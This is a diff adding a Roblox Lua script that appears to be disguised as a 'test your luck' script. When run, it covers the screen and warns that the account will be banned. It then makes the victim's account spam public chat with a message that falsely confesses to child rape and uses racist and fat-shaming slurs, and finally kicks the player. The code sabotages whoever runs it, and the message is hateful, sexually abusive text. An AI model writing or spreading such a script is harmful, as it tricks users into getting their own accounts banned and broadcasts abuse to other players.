@@ -1,0 +1,72 @@
+local gui = Instance.new("ScreenGui")
+gui.Parent = game.CoreGui
+
+local hehe = Instance.new("ImageLabel")
+hehe.Size = UDim2.new(1.15, 0, 1.15, 0)
+hehe.Position = UDim2.new(-0.15, 0, -0.15, 0)
+hehe.BackgroundColor3 = Color3.new(0, 0, 0)
+hehe.ImageColor3 = Color3.new(1, 1, 1)
+hehe.Image = "rbxassetid://111488228277732"
+hehe.ImageTransparency = 0
+hehe.BackgroundTransparency = 1
+hehe.Parent = gui
+
+local name = Instance.new("TextLabel")
+name.Size = UDim2.new(1, 0, 0.1, 0)
+name.Position = UDim2.new(0, 0, -0.1, 0)
+name.BackgroundColor3 = Color3.new(0, 0, 0)
+name.BorderColor3 = Color3.new(0, 0, 0)
+name.BorderSizePixel = 0
+name.Text = "PlayStationIN: 🔥Test your luck, Deleted and days🔥"
+name.TextColor3 = Color3.new(255, 255, 255)
+name.BackgroundTransparency = 0
+name.Font = Enum.Font.Code
+name.TextSize = 30
+name.Parent = gui
+
+local nameb = Instance.new("TextLabel")
+nameb.Size = UDim2.new(1, 0, 0.1, 0)
+nameb.Position = UDim2.new(0, 0, 0.9, 0)
+nameb.BackgroundColor3 = Color3.new(0, 0, 0)
+nameb.BorderColor3 = Color3.new(0, 0, 0)
+nameb.BorderSizePixel = 0
+nameb.Text = "🔥🔥🔥😂😂YOUR ACCOUNT BANNED IN 15 SECONDS😂😂🔥🔥🔥"
+nameb.TextColor3 = Color3.new(255, 255, 255)
+nameb.BackgroundTransparency = 0
+nameb.Font = Enum.Font.Code
+nameb.TextSize = 30
+nameb.Parent = gui
+
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+
+local function sendMessage(msg)
+    local player = Players.LocalPlayer
+    if TextChatService.ChatInputBarConfiguration.TargetTextChannel then
+        TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(msg)
+    else
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+    end
+end
+
+local spamMessage = "i rape children, fattie fat black fat i support child endangerment"
+local spamDuration = 10
+local spamInterval = 1
+
+for i = 1, spamDuration / spamInterval do
+    sendMessage(spamMessage)
+    wait(spamInterval)
+end
+
+local Players = game:GetService("Players")
+
+local function kickPlayer(player, delay, message)
+    task.delay(delay, function()
+        if player and player:IsDescendantOf(Players) then
+            player:Kick(message)
+        end
+    end)
+end
+
+local player = Players.LocalPlayer
+kickPlayer(player, 15, "you leave you banned")
